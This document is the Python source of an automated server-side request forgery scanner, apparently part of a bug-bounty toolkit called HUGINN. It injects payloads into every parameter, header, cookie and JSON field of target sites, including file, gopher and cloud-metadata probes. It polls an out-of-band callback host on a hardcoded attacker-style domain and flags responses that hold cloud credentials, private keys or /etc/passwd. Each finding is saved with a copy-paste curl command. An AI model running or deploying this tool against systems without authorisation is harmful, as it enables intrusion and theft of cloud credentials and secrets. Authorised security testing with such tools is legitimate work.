#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# =============================================================================
#  HUGINN :: ssrf.py
#  The Ultimate Server-Side Request Forgery Scanner — 2026 Edition
# -----------------------------------------------------------------------------
#  Detection pipeline:
#    1. Inject payload into every reachable parameter
#    2. Capture a baseline (response + elapsed time)
#    3. Send the payload, honouring per-payload method/headers
#    4. Classify the response across five signal tiers:
#         · confirmed : OOB token appears in the receiver's check.php log
#         · critical  : credential-shaped strings in the body
#         · high      : payload-specific detection string OR local file read
#         · medium    : timing anomaly OR response length delta on internal IP
#         · low       : generic internal-service marker (redis_version, etc.)
#    5. Emit a self-contained finding: URL, payload, evidence, response
#       snippet, and a copy-pasteable cURL command.
#
#  Injection transports:
#    · Query params · POST form bodies · JSON bodies · Cookies
#    · HTTP headers · Path segments · HPP
#
#  Payload metadata honoured:
#    method      : override HTTP verb (PUT for AWS IMDSv2 token mint)
#    headers     : add payload-specific headers (Metadata-Flavor, etc.)
#    detection   : explicit response substring that proves success
#    provider    : filter by aws / gcp / azure / digitalocean / etc.
#    protocol    : file / gopher / dict / ldap / smb / tftp / ...
#    service     : redis / memcached / fastcgi / docker / kubernetes / ...
#    severity_hint : baseline severity from the YAML
# =============================================================================

import re
import json
import time
import shlex
import hashlib
import threading
from pathlib import Path
from urllib.parse import (urlparse, parse_qs, urlencode, urlunparse,
                          urljoin, quote, unquote)
from concurrent.futures import ThreadPoolExecutor, as_completed

from huginn_utils import (
    log, section, load_json, save_json, load_payloads, send_request,
    safe_filename, C,
    random_token, build_oob_url,
)

try:
    import requests
except ImportError:
    requests = None

try:
    from bs4 import BeautifulSoup
except ImportError:
    BeautifulSoup = None


# =============================================================================
#  CONSTANTS
# =============================================================================

DEFAULT_ATTACKER     = "beardedviking.org"
DEFAULT_COLLAB       = "oast.beardedviking.org"
DEFAULT_CANARY       = "redirect.beardedviking.org"
DEFAULT_OOB_CHECK    = "https://oast.beardedviking.org/check.php"

# Generic markers that indicate an internal service responded
INTERNAL_MARKERS = [
    "redis_version", "memcached", "STAT version",
    "elasticsearch", "cluster_name",
    "root:x:0:0", "daemon:x:", "/bin/bash",
    "ami-id", "instance-id", "AccessKeyId", "SecretAccessKey",
    "computemetadata", "metadata-flavor",
    "access_token", "AuthenticationResult",
    "kubelet", "kubernetes", "pods",
    "Docker", "containers/json",
    "droplet_id", "opc/v1", "opc/v2",
    "iam/security-credentials", "user-data",
    "ssh-rsa", "BEGIN OPENSSH", "BEGIN RSA",
    "DB_PASSWORD", "DATABASE_URL", "AWS_SECRET",
    "mongodb://", "postgresql://", "mysql://",
]

# Credential-shaped strings → escalate to "critical" on sight
CREDENTIAL_MARKERS = [
    "AccessKeyId", "SecretAccessKey", "SessionToken",
    "access_token", "refresh_token", "client_secret",
    "private_key", "BEGIN RSA PRIVATE KEY", "BEGIN OPENSSH PRIVATE KEY",
    "client_id", "aws_access_key_id", "aws_secret_access_key",
    "X-Amz-Security-Token", "AuthenticationResult",
]

# Metadata URLs / endpoints → escalate to "critical" if reachable
METADATA_MARKERS = [
    "169.254.169.254", "100.100.100.200", "169.254.170.2",
    "metadata.google.internal", "metadata/v1", "opc/v1", "opc/v2",
    "latest/meta-data", "computeMetadata",
]

# Headers worth fuzzing (independent of payload category)
FUZZABLE_HEADERS = [
    "Referer", "User-Agent", "X-Forwarded-For", "X-Forwarded-Host",
    "X-Real-IP", "X-Originating-IP", "X-Remote-IP", "X-Remote-Addr",
    "X-Client-IP", "Forwarded", "Origin", "Host",
    "X-Original-URL", "X-Rewrite-URL", "X-Callback-Url",
    "X-Auth-Token", "X-Api-Key", "Callback-Url",
]

# Categories that route differently
ROUTE_HEADER_CATEGORY = "header_based"
ROUTE_COOKIE_CATEGORY = "cookie_based"
ROUTE_HPP_CATEGORY    = "parameter_pollution"

# Timing heuristics
TIME_DELAY_THRESHOLD   = 3.5    # min delta to flag timing anomaly
LENGTH_DELTA_THRESHOLD = 500    # min response length delta for blind


# =============================================================================
#  PLACEHOLDER SUBSTITUTION
# =============================================================================
def _substitute_all(payload, attacker, target, collab, canary,
                    oob_url, oob_host, canary_url, token):
    """Replace every HUGINN placeholder in the payload template."""
    return (payload
            .replace("{{ATTACKER}}",   attacker)
            .replace("{{TARGET}}",     target)
            .replace("{{COLLAB}}",     collab)
            .replace("{{CANARY}}",     canary)
            .replace("{{OOB}}",        oob_url)
            .replace("{{OOB_HOST}}",   oob_host)
            .replace("{{CANARY_URL}}", canary_url)
            .replace("{{RANDOM}}",     f"huginn-{token}"))


# =============================================================================
#  HELPERS
# =============================================================================
def _build_query_string(params):
    """
    Build a query string, preserving percent-encoded payload values as-is.
    urllib.urlencode() would double-encode '%2f' → '%252f', breaking every
    encoding-bypass payload.
    """
    pairs = []
    for k, v in params.items():
        if isinstance(v, list):
            for item in v:
                pairs.append(f"{quote(str(k), safe='')}={item}")
        else:
            pairs.append(f"{quote(str(k), safe='')}={v}")
    return "&".join(pairs)


def _parse_header_payload(payload):
    """Parse 'H1: v1|H2: v2' or 'H1: v1' into dict."""
    if "|" in payload:
        out = {}
        for chunk in payload.split("|"):
            if ":" not in chunk:
                return None
            name, _, val = chunk.partition(":")
            out[name.strip()] = val.strip()
        return out or None
    if ":" in payload:
        name, _, val = payload.partition(":")
        return {name.strip(): val.strip()}
    return None


def _parse_cookie_payload(payload):
    if "=" not in payload:
        return None
    name, _, val = payload.partition("=")
    return {name.strip(): val.strip()}


def _match_any(body, markers):
    if not body:
        return None
    low = body.lower()
    for m in markers:
        if m.lower() in low:
            return m
    return None


def _is_credential_leak(body):
    return _match_any(body, CREDENTIAL_MARKERS)


def _contains_detection_string(body, detection_field):
    """Extract quoted substrings from the YAML's detection field and check them."""
    if not body or not detection_field:
        return None
    quoted = re.findall(r"'([^']+)'|\"([^\"]+)\"", detection_field)
    candidates = [a or b for a, b in quoted]
    for c in candidates:
        if c.lower() in body.lower():
            return c
    return None


def _is_metadata_body(body):
    if not body:
        return None
    low = body.lower()
    for m in METADATA_MARKERS:
        if m.lower() in low:
            return m
    return None


def _response_snippet(body, needle, window=180):
    """Return a ~360 char window around the first occurrence of `needle`."""
    if not body:
        return ""
    if not needle:
        return body[:window * 2]
    idx = body.lower().find(needle.lower())
    if idx == -1:
        return body[:window * 2]
    return body[max(0, idx - window): idx + len(needle) + window]


# =============================================================================
#  INJECTION POINT MODEL
# =============================================================================
class InjectionPoint:
    __slots__ = ("url", "method", "location", "name", "value",
                 "json_path", "json_body", "form_data", "extra_headers",
                 "baseline_resp", "baseline_elapsed")

    def __init__(self, url, method, location, name, value,
                 json_path=None, json_body=None, form_data=None,
                 extra_headers=None):
        self.url = url
        self.method = method
        self.location = location
        self.name = name
        self.value = value
        self.json_path = json_path
        self.json_body = json_body
        self.form_data = form_data
        self.extra_headers = extra_headers or {}
        self.baseline_resp = None
        self.baseline_elapsed = None

    def key(self):
        return (self.url, self.method, self.location, self.name)

    def __repr__(self):
        return f"<IP {self.location}:{self.name} @ {self.method} {self.url}>"


# =============================================================================
#  INJECTION POINT EXTRACTION
# =============================================================================
def _extract_query_params(page):
    p = urlparse(page["url"])
    if not p.query:
        return []
    qs = parse_qs(p.query, keep_blank_values=True)
    return [InjectionPoint(page["url"], "GET", "query", k, v[0])
            for k, v in qs.items()]


def _extract_path_segments(page):
    p = urlparse(page["url"])
    segs = [s for s in p.path.split("/") if s]
    if not segs:
        return []
    return [InjectionPoint(page["url"], "GET", "path",
                           f"segment[{i}]", seg,
                           extra_headers={"_segment_index": str(i)})
            for i, seg in enumerate(segs)]


def _extract_forms(page):
    if BeautifulSoup is None:
        return []
    html = page.get("content") or ""
    if not html:
        return []
    try:
        soup = BeautifulSoup(html, "html.parser")
    except Exception:
        return []
    points = []
    for form in soup.find_all("form"):
        action = form.get("action") or page["url"]
        action_url = urljoin(page["url"], action)
        method = (form.get("method") or "GET").upper()
        data = {}
        for inp in form.find_all(["input", "textarea", "select"]):
            name = inp.get("name")
            if not name:
                continue
            if inp.has_attr("type") and inp["type"].lower() in ("submit", "button", "file"):
                continue
            data[name] = inp.get("value") or ""
        for name, value in data.items():
            points.append(InjectionPoint(
                action_url, method, "body_form", name, value,
                form_data=dict(data),
            ))
    return points


def _extract_headers(page):
    return [InjectionPoint(page["url"], "GET", "header", h, "")
            for h in FUZZABLE_HEADERS]


def _extract_cookies(page):
    headers = page.get("headers") or {}
    sc = headers.get("Set-Cookie") or headers.get("set-cookie") or ""
    if not sc:
        return []
    points = []
    for chunk in sc.split(","):
        m = re.match(r"\s*([^=]+)=([^;]+)", chunk)
        if m:
            points.append(InjectionPoint(
                page["url"], "GET", "cookie",
                m.group(1).strip(), m.group(2).strip(),
            ))
    return points


def _extract_json_body(page):
    ct = (page.get("content_type") or "").lower()
    content = page.get("content") or ""
    if "json" not in ct and not content.lstrip().startswith(("{", "[")):
        return []
    try:
        body = json.loads(content)
    except Exception:
        return []
    points = []

    def walk(obj, path="$"):
        if isinstance(obj, dict):
            for k, v in obj.items():
                walk(v, f"{path}.{k}")
        elif isinstance(obj, list):
            for i, v in enumerate(obj):
                walk(v, f"{path}[{i}]")
        else:
            points.append(InjectionPoint(
                page["url"], "POST", "body_json", path, str(obj),
                json_path=path, json_body=body,
            ))

    walk(body)
    return points


def extract_injection_points(pages):
    points, seen = [], set()
    for page in pages:
        cands = []
        cands.extend(_extract_query_params(page))
        cands.extend(_extract_path_segments(page))
        cands.extend(_extract_forms(page))
        cands.extend(_extract_headers(page))
        cands.extend(_extract_cookies(page))
        cands.extend(_extract_json_body(page))
        for ip in cands:
            k = ip.key()
            if k in seen:
                continue
            seen.add(k)
            points.append(ip)
    return points


# =============================================================================
#  REQUEST + CURL BUILDERS
# =============================================================================
def _set_json_path(obj, path, value):
    tokens = re.findall(r"\.([^\.\[\]]+)|\[(\d+)\]", path)
    cur = obj
    for i, (name, idx) in enumerate(tokens):
        key = name if name else int(idx)
        if i == len(tokens) - 1:
            cur[key] = value
            return
        cur = cur[key]


def build_request(ip, payload, payload_meta=None, timeout=15):
    """Build + send the injected request, honouring payload metadata."""
    payload_meta = payload_meta or {}
    extra_hdrs = dict(payload_meta.get("headers") or {})
    override_method = (payload_meta.get("method") or "").upper() or None
    override_data = payload_meta.get("data")

    headers = dict(ip.extra_headers)
    headers.update(extra_hdrs)
    url = ip.url
    method = override_method or ip.method
    data = override_data

    if ip.location == "query":
        p = urlparse(url)
        qs = parse_qs(p.query, keep_blank_values=True)
        qs[ip.name] = [payload]
        url = urlunparse(p._replace(query=_build_query_string(qs)))

    elif ip.location == "path":
        idx = int(headers.pop("_segment_index", "0"))
        p = urlparse(url)
        segs = [s for s in p.path.split("/") if s]
        if idx < len(segs):
            segs[idx] = payload
        url = urlunparse(p._replace(path="/" + "/".join(segs)))

    elif ip.location == "body_form":
        body = dict(ip.form_data or {})
        body[ip.name] = payload
        if method == "GET":
            p = urlparse(url)
            url = urlunparse(p._replace(query=_build_query_string(body)))
            data = None
        else:
            data = body
            headers.setdefault("Content-Type",
                               "application/x-www-form-urlencoded")

    elif ip.location == "body_json":
        body = json.loads(json.dumps(ip.json_body))
        _set_json_path(body, ip.json_path, payload)
        data = json.dumps(body)
        headers.setdefault("Content-Type", "application/json")

    elif ip.location == "cookie":
        existing = headers.get("Cookie", "")
        pair = f"{ip.name}={payload}"
        headers["Cookie"] = f"{existing}; {pair}".strip("; ") if existing else pair

    elif ip.location == "header":
        headers[ip.name] = payload

    return send_request(
        url, method=method, headers=headers,
        timeout=timeout, allow_redirects=False, data=data,
    )


def build_curl(ip, payload, payload_meta=None, timeout=15):
    """Build a copy-pasteable cURL command for a finding."""
    payload_meta = payload_meta or {}
    override_method = (payload_meta.get("method") or "").upper() or None
    extra_hdrs = dict(payload_meta.get("headers") or {})

    parts = ["curl", "-sk", "--max-time", str(timeout), "-i"]

    if ip.location == "query":
        p = urlparse(ip.url)
        qs = parse_qs(p.query, keep_blank_values=True)
        qs[ip.name] = [payload]
        url = urlunparse(p._replace(query=_build_query_string(qs)))
        parts.append(shlex.quote(url))

    elif ip.location == "path":
        idx = int((ip.extra_headers or {}).get("_segment_index", "0"))
        p = urlparse(ip.url)
        segs = [s for s in p.path.split("/") if s]
        if idx < len(segs):
            segs[idx] = payload
        url = urlunparse(p._replace(path="/" + "/".join(segs)))
        parts.append(shlex.quote(url))

    elif ip.location == "body_form":
        body = dict(ip.form_data or {})
        body[ip.name] = payload
        if ip.method == "GET":
            p = urlparse(ip.url)
            url = urlunparse(p._replace(query=_build_query_string(body)))
            parts.append(shlex.quote(url))
        else:
            parts.extend(["-X", override_method or "POST"])
            for k, v in body.items():
                parts.extend(["--data-urlencode", shlex.quote(f"{k}={v}")])
            parts.append(shlex.quote(ip.url))

    elif ip.location == "body_json":
        body = json.loads(json.dumps(ip.json_body))
        _set_json_path(body, ip.json_path, payload)
        parts.extend(["-X", override_method or "POST"])
        parts.extend(["-H", shlex.quote("Content-Type: application/json")])
        parts.extend(["--data-raw", shlex.quote(json.dumps(body))])
        parts.append(shlex.quote(ip.url))

    elif ip.location == "cookie":
        parts.extend(["-H", shlex.quote(f"Cookie: {ip.name}={payload}")])
        parts.append(shlex.quote(ip.url))

    elif ip.location == "header":
        parts.extend(["-H", shlex.quote(f"{ip.name}: {payload}")])
        parts.append(shlex.quote(ip.url))

    else:
        parts.append(shlex.quote(ip.url))

    # Add per-payload extra headers
    for name, val in extra_hdrs.items():
        parts.extend(["-H", shlex.quote(f"{name}: {val}")])

    # Method override
    if override_method and override_method not in ("GET", "POST"):
        parts.extend(["-X", override_method])

    return " ".join(parts)


# =============================================================================
#  REMOTE OOB POLLER — checks oast.beardedviking.org/check.php
# =============================================================================
class RemoteOOBPoller:
    """
    Polls check.php?list=1 on the OOB receiver for async token confirmation.
    Every token the scanner sends gets tracked; if it appears in the
    receiver log, the corresponding finding is upgraded to confirmed.
    """

    def __init__(self, check_url, poll_interval=4.0, timeout=180.0,
                 verify=False):
        self.check_url = check_url.rstrip("/")
        self.poll_interval = poll_interval
        self.timeout = timeout
        self.verify = verify
        self._seen = set()
        self._lock = threading.Lock()
        self._stop = threading.Event()
        self._thread = None

    def start(self):
        if requests is None:
            return False
        self._thread = threading.Thread(target=self._loop, daemon=True)
        self._thread.start()
        return True

    def stop(self):
        self._stop.set()
        if self._thread:
            self._thread.join(timeout=3)

    def _loop(self):
        deadline = time.time() + self.timeout
        endpoint = f"{self.check_url}?list=1"
        while not self._stop.is_set() and time.time() < deadline:
            try:
                r = requests.get(endpoint, timeout=6, verify=self.verify)
                if r.status_code == 200:
                    data = r.json()
                    toks = data.get("tokens", {})
                    if isinstance(toks, dict):
                        with self._lock:
                            for tok in toks.keys():
                                self._seen.add(tok.lower())
            except Exception:
                pass
            time.sleep(self.poll_interval)

    def has_token(self, token):
        if not token:
            return False
        with self._lock:
            return token.lower() in self._seen

    def all_tokens(self):
        with self._lock:
            return set(self._seen)


# =============================================================================
#  LOCAL OOB POLLER — for interactsh / local log files
# =============================================================================
class LocalOOBPoller:
    """Watches a local file for huginn-<token> lines."""

    def __init__(self, log_file, poll_interval=2.0, timeout=180.0):
        self.log_file = Path(log_file)
        self.poll_interval = poll_interval
        self.timeout = timeout
        self._seen = set()
        self._lock = threading.Lock()
        self._stop = threading.Event()
        self._thread = None

    def start(self):
        if not self.log_file or not self.log_file.exists():
            return False
        self._thread = threading.Thread(target=self._loop, daemon=True)
        self._thread.start()
        return True

    def stop(self):
        self._stop.set()
        if self._thread:
            self._thread.join(timeout=3)

    def _loop(self):
        deadline = time.time() + self.timeout
        last_size = 0
        while not self._stop.is_set() and time.time() < deadline:
            try:
                size = self.log_file.stat().st_size
                if size != last_size:
                    content = self.log_file.read_text(errors="ignore")
                    for m in re.finditer(r"huginn-([a-f0-9]{16,32})", content):
                        with self._lock:
                            self._seen.add(m.group(1).lower())
                    last_size = size
            except Exception:
                pass
            time.sleep(self.poll_interval)

    def has_token(self, token):
        if not token:
            return False
        with self._lock:
            return token.lower() in self._seen

    def all_tokens(self):
        with self._lock:
            return set(self._seen)


# =============================================================================
#  SCANNER
# =============================================================================
class SSRFScanner:

    def __init__(self,
                 program_dir,
                 sites_root=None,
                 attacker_domain=DEFAULT_ATTACKER,
                 collab_host=DEFAULT_COLLAB,
                 canary_host=DEFAULT_CANARY,
                 oob_check_url=DEFAULT_OOB_CHECK,
                 target_domain=None,
                 provider_filter=None,
                 max_workers=8,
                 delay=0.15,
                 timeout=15,
                 oob_log_file=None,
                 oob_timeout=180.0):
        self.program_dir = Path(program_dir)
        self.sites_root = Path(sites_root or (self.program_dir / "sites"))
        self.findings_root = self.program_dir / "findings" / "ssrf"
        self.findings_root.mkdir(parents=True, exist_ok=True)

        self.attacker_domain = attacker_domain
        self.collab_host     = collab_host
        self.canary_host     = canary_host
        self.oob_check_url   = oob_check_url
        self.target_domain   = target_domain or ""
        self.provider_filter = (provider_filter or "").lower() or None
        self.max_workers     = max_workers
        self.delay           = delay
        self.timeout         = timeout

        self.seen_signatures = set()
        self._payloads = None
        self._tokens_by_id = {}

        # ---- OOB poller selection ----------------------------------------
        if oob_log_file:
            self.oob_poller = LocalOOBPoller(oob_log_file, timeout=oob_timeout)
        elif oob_check_url:
            self.oob_poller = RemoteOOBPoller(oob_check_url, timeout=oob_timeout)
        else:
            self.oob_poller = None

    # ------------------------------------------------------------------ #
    #  Payload loading with per-payload OOB substitution
    # ------------------------------------------------------------------ #
    def load_and_filter_payloads(self):
        data = load_payloads("ssrf")
        raw = data.get("payloads", [])
        ctx_target = self.target_domain or "target.invalid"
        out = []

        for entry in raw:
            if isinstance(entry, str):
                token = random_token()
                oob_url = build_oob_url(self.collab_host, token,
                                        path_hint="ssrf")
                canary_url = f"https://{self.canary_host}/huginn-{token}/raw"
                p = _substitute_all(
                    entry, self.attacker_domain, ctx_target,
                    self.collab_host, self.canary_host,
                    oob_url, urlparse(oob_url).netloc,
                    canary_url, token,
                )
                out.append({
                    "id": "raw", "name": "raw", "category": "unknown",
                    "payload": p, "tags": [], "description": "",
                    "_token": token, "_oob_url": oob_url,
                })
                continue

            # Provider filter
            provider = (entry.get("provider") or "").lower()
            if self.provider_filter and provider and provider != self.provider_filter:
                continue

            entry = dict(entry)
            token = random_token()
            oob_url = build_oob_url(self.collab_host, token,
                                    path_hint=entry["id"])
            oob_host = urlparse(oob_url).netloc
            canary_url = (f"https://{self.canary_host}/huginn-{token}/"
                          f"{entry['id']}")

            entry["payload"] = _substitute_all(
                entry["payload"], self.attacker_domain, ctx_target,
                self.collab_host, self.canary_host,
                oob_url, oob_host, canary_url, token,
            )
            entry["_token"] = token
            entry["_oob_url"] = oob_url
            entry["_canary_url"] = canary_url
            self._tokens_by_id[entry["id"]] = token
            out.append(entry)

        self._payloads = out
        return out

    # ------------------------------------------------------------------ #
    #  Baseline capture
    # ------------------------------------------------------------------ #
    def capture_baseline(self, ip):
        start = time.time()
        try:
            ip.baseline_resp = build_request(ip, ip.value, timeout=self.timeout)
        except Exception:
            ip.baseline_resp = None
        ip.baseline_elapsed = time.time() - start
        return ip.baseline_resp

    # ------------------------------------------------------------------ #
    #  Detection engine — five-tier severity ladder
    # ------------------------------------------------------------------ #
    def _classify(self, ip, payload_obj, resp, elapsed):
        """
        Return a dict describing the hit, or None.
        Severity order: confirmed > critical > high > medium > low
        """
        if resp is None:
            return None

        body = resp.text or ""
        detection_field = payload_obj.get("detection", "")
        category = payload_obj.get("category", "")
        protocol = payload_obj.get("protocol", "")

        # ---- 1. Local file read (protocol=file) --------------------------
        if protocol == "file":
            if re.search(r"root:[x*]?:0:0", body) or "[extensions]" in body:
                return {
                    "severity": "high",
                    "reason": "Local file read confirmed (/etc/passwd or win.ini)",
                    "evidence": body[:200],
                    "subtype": "local_file_read",
                    "verification_method": "file_read",
                }
            if "AWS_ACCESS_KEY" in body or "DATABASE_URL" in body or \
               "SECRET_KEY" in body:
                return {
                    "severity": "critical",
                    "reason": "Secrets in /proc/self/environ response",
                    "evidence": body[:200],
                    "subtype": "env_secret_leak",
                    "verification_method": "env_read",
                }

        # ---- 2. Credential leak (any category) ---------------------------
        cred = _is_credential_leak(body)
        if cred:
            return {
                "severity": "critical",
                "reason": f"Credential-shaped string in response: '{cred}'",
                "evidence": cred,
                "subtype": "cloud_credential_leak",
                "verification_method": "credential_marker",
            }

        # ---- 3. Metadata reachability -----------------------------------
        meta = _is_metadata_body(body)
        if meta and category in ("cloud_metadata", "modern",
                                 "internal_rfc1918", "waf_bypass"):
            return {
                "severity": "critical",
                "reason": f"Cloud metadata marker in response: '{meta}'",
                "evidence": meta,
                "subtype": "cloud_metadata",
                "verification_method": "metadata_marker",
            }

        # ---- 4. Explicit detection string from YAML ----------------------
        matched = _contains_detection_string(body, detection_field)
        if matched:
            return {
                "severity": "high",
                "reason": f"Payload-specific detection string matched: '{matched}'",
                "evidence": matched,
                "subtype": self._subtype(payload_obj),
                "verification_method": "detection_string",
            }

        # ---- 5. Internal-service marker ---------------------------------
        internal = _match_any(body, INTERNAL_MARKERS)
        if internal:
            # Redis, memcached, docker etc. → high if it's an internal service
            # Generic markers on random payloads → low
            if category in ("internal_service", "protocol_abuse"):
                sev = "high"
            elif category == "cloud_metadata":
                sev = "high"
            else:
                sev = "medium"
            return {
                "severity": sev,
                "reason": f"Internal-service marker in response: '{internal}'",
                "evidence": internal,
                "subtype": self._subtype(payload_obj),
                "verification_method": "internal_marker",
            }

        # ---- 6. Timing anomaly (blind detection) -------------------------
        if ip.baseline_elapsed is not None and elapsed is not None:
            delta = elapsed - ip.baseline_elapsed
            if delta >= TIME_DELAY_THRESHOLD:
                return {
                    "severity": "medium",
                    "reason": (f"Timing anomaly: baseline "
                               f"{ip.baseline_elapsed:.2f}s vs probe "
                               f"{elapsed:.2f}s (+{delta:.2f}s)"),
                    "evidence": f"+{delta:.2f}s",
                    "subtype": "timing_blind",
                    "verification_method": "timing",
                }

        # ---- 7. Response length delta on internal-IP payload -------------
        if ip.baseline_resp is not None and resp.status_code == 200:
            base_len = len(ip.baseline_resp.text or "")
            probe_len = len(body)
            if abs(probe_len - base_len) >= LENGTH_DELTA_THRESHOLD:
                payload_low = payload_obj["payload"].lower()
                if any(x in payload_low for x in (
                        "127.", "localhost", "169.254", "10.", "172.1",
                        "192.168", "[::", "0.0.0.0", "metadata",
                        "oob", "canary")):
                    return {
                        "severity": "medium",
                        "reason": (f"Response length delta: {base_len} -> "
                                   f"{probe_len}"),
                        "evidence": f"delta={probe_len - base_len}",
                        "subtype": "blind_length_delta",
                        "verification_method": "length_delta",
                    }

        return None

    @staticmethod
    def _subtype(payload_obj):
        cat = payload_obj.get("category", "")
        if cat == "cloud_metadata":
            return "cloud_metadata"
        if cat == "protocol_abuse":
            return f"protocol_{payload_obj.get('protocol', 'unknown')}"
        if cat == "internal_service":
            return f"internal_{payload_obj.get('service', 'service')}"
        if cat == "blind_oob":
            return "blind_oob"
        if cat == "modern":
            return "modern_bypass"
        if cat == "whitelist_bypass":
            return "whitelist_bypass"
        if cat == "waf_bypass":
            return "waf_bypass"
        if cat == "internal_rfc1918":
            return "internal_rfc1918"
        if cat == "basic_loopback":
            return "loopback"
        if cat == "ip_encoding":
            return "ip_encoding"
        if cat == "dns_rebinding":
            return "dns_rebinding"
        return "generic_ssrf"

    # ------------------------------------------------------------------ #
    #  Test one payload against one injection point
    # ------------------------------------------------------------------ #
    def test_payload(self, ip, payload_obj):
        category = payload_obj.get("category", "")
        payload = payload_obj["payload"]

        # ---- Route special categories ------------------------------------
        if category == ROUTE_HEADER_CATEGORY:
            parsed = _parse_header_payload(payload)
            if not parsed:
                return None
            hdrs = dict(parsed)
            for k, v in (payload_obj.get("headers") or {}).items():
                hdrs[k] = v
            method = payload_obj.get("method", "GET").upper()
            start = time.time()
            try:
                resp = send_request(ip.url, method=method, headers=hdrs,
                                    timeout=self.timeout,
                                    allow_redirects=False)
            except Exception:
                return None
            elapsed = time.time() - start
            hit = self._classify(ip, payload_obj, resp, elapsed)
            if not hit:
                return None
            return self._build_finding(ip, payload_obj, hit, resp, elapsed,
                                       extra={"injected_headers": parsed})

        if category == ROUTE_COOKIE_CATEGORY:
            parsed = _parse_cookie_payload(payload)
            if not parsed:
                return None
            cookie_hdr = "; ".join(f"{k}={v}" for k, v in parsed.items())
            start = time.time()
            try:
                resp = send_request(ip.url, method="GET",
                                    headers={"Cookie": cookie_hdr},
                                    timeout=self.timeout,
                                    allow_redirects=False)
            except Exception:
                return None
            elapsed = time.time() - start
            hit = self._classify(ip, payload_obj, resp, elapsed)
            if not hit:
                return None
            return self._build_finding(ip, payload_obj, hit, resp, elapsed,
                                       extra={"injected_cookies": parsed})

        if category == ROUTE_HPP_CATEGORY:
            p = urlparse(ip.url)
            base = urlunparse(p._replace(query=""))
            target_url = base + (payload if payload.startswith("?") else "?" + payload)
            start = time.time()
            try:
                resp = send_request(target_url, method="GET",
                                    timeout=self.timeout,
                                    allow_redirects=False)
            except Exception:
                return None
            elapsed = time.time() - start
            hit = self._classify(ip, payload_obj, resp, elapsed)
            if not hit:
                return None
            return self._build_finding(ip, payload_obj, hit, resp, elapsed,
                                       extra={"hpp_url": target_url})

        # ---- Standard transport ------------------------------------------
        start = time.time()
        try:
            resp = build_request(ip, payload, payload_meta=payload_obj,
                                 timeout=self.timeout)
        except Exception:
            return None
        elapsed = time.time() - start

        hit = self._classify(ip, payload_obj, resp, elapsed)

        # ---- OOB fallback (blind SSRF) -----------------------------------
        token = payload_obj.get("_token")
        oob_confirmed = False
        if self.oob_poller and token:
            if not hit:
                # give the target a brief moment
                time.sleep(0.4)
            if self.oob_poller.has_token(token):
                oob_confirmed = True
                if not hit:
                    hit = {
                        "severity": "confirmed",
                        "reason": "Out-of-band callback received on OOB receiver",
                        "evidence": payload_obj.get("_oob_url", ""),
                        "subtype": "blind_oob_confirmed",
                        "verification_method": "oob_token",
                    }
                elif hit.get("severity") != "confirmed":
                    hit["severity"] = "confirmed"
                    hit["verification_method"] = "oob_token"

        if not hit:
            return None
        return self._build_finding(ip, payload_obj, hit, resp, elapsed,
                                   oob_confirmed=oob_confirmed)

    # ------------------------------------------------------------------ #
    #  Finding construction
    # ------------------------------------------------------------------ #
    def _build_finding(self, ip, payload_obj, hit, resp, elapsed,
                       extra=None, oob_confirmed=False):
        severity = hit["severity"]

        body = resp.text if resp is not None else ""
        needle = (payload_obj.get("detection") or
                  (payload_obj.get("_token") and
                   f"huginn-{payload_obj['_token']}") or
                  "")

        finding = {
            "type": "ssrf",
            "subtype": hit.get("subtype", "generic_ssrf"),
            "severity": severity,
            "confirmed": severity == "confirmed",
            "verification_method": hit.get("verification_method"),

            "url": ip.url,
            "method": ip.method,
            "parameter": ip.name,
            "injection_point": {
                "location": ip.location,
                "name": ip.name,
                "original_value": (ip.value or "")[:200],
                "json_path": ip.json_path,
            },

            "payload_id":          payload_obj.get("id"),
            "payload_name":        payload_obj.get("name"),
            "payload":             payload_obj["payload"],
            "payload_category":    payload_obj.get("category"),
            "payload_provider":    payload_obj.get("provider"),
            "payload_protocol":    payload_obj.get("protocol"),
            "payload_service":     payload_obj.get("service"),
            "payload_tags":        payload_obj.get("tags", []),
            "payload_description": payload_obj.get("description", ""),
            "payload_references":  payload_obj.get("references", []),
            "payload_severity_hint": payload_obj.get("severity_hint"),

            "detection_reason": hit["reason"],
            "evidence":         hit.get("evidence", ""),

            "response_status":   resp.status_code if resp is not None else None,
            "response_length":   len(body) if body is not None else None,
            "response_snippet":  _response_snippet(body, needle),

            "baseline_status":   (ip.baseline_resp.status_code
                                  if ip.baseline_resp else None),
            "baseline_length":   (len(ip.baseline_resp.text or "")
                                  if ip.baseline_resp else None),
            "baseline_elapsed":  round(ip.baseline_elapsed or 0, 3),
            "elapsed_seconds":   round(elapsed, 3),

            "curl_command": build_curl(ip, payload_obj["payload"],
                                       payload_obj),

            "attacker_domain": self.attacker_domain,
            "collab_host":     self.collab_host,
            "canary_host":     self.canary_host,
            "oob_url":         payload_obj.get("_oob_url"),
            "oob_token":       payload_obj.get("_token"),
            "oob_confirmed":   oob_confirmed,
            "target_domain":   self.target_domain,

            "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
            "remediation": (
                "Enforce a strict allow-list of permitted destinations. "
                "Resolve and validate the destination host before making the "
                "request (block RFC1918, link-local, loopback, IPv6 transition "
                "addresses, and cloud metadata IPs). Do not trust "
                "X-Forwarded-Host or Referer. Use a dedicated egress proxy "
                "that enforces the allow-list. On cloud, require IMDSv2 (AWS) "
                "and disable unused metadata services. Forbid non-http(s) "
                "schemes (gopher, dict, file, ldap, smb)."
            ),
        }
        if extra:
            finding["injection_extra"] = extra

        # ---- Dedup -------------------------------------------------------
        sig = hashlib.md5(
            f"{ip.url}|{ip.name}|{payload_obj.get('id')}|{severity}".encode()
        ).hexdigest()
        if sig in self.seen_signatures:
            return None
        self.seen_signatures.add(sig)

        # ---- Persist -----------------------------------------------------
        host = urlparse(ip.url).netloc
        slug = safe_filename(
            (urlparse(ip.url).path or "/").replace("/", "_") or "_root"
        )
        fname = (f"{slug}__{safe_filename(ip.name)}__"
                 f"{payload_obj.get('id','x')}_ssrf_vulnerable.json")
        out_path = self.findings_root / safe_filename(host) / fname
        save_json(out_path, finding)

        sev_color = {
            "confirmed": "\033[38;5;46m",
            "critical":  "\033[38;5;196m",
            "high":      "\033[38;5;208m",
            "medium":    "\033[38;5;226m",
            "low":       "\033[38;5;240m",
        }.get(severity, "\033[0m")

        log(
            f"[{sev_color}{severity.upper():9}\033[0m] "
            f"{ip.location}:{ip.name} @ {ip.url} "
            f"({payload_obj.get('name')} → {hit.get('subtype')})",
            "hit", "SSRF",
        )
        return finding

    # ------------------------------------------------------------------ #
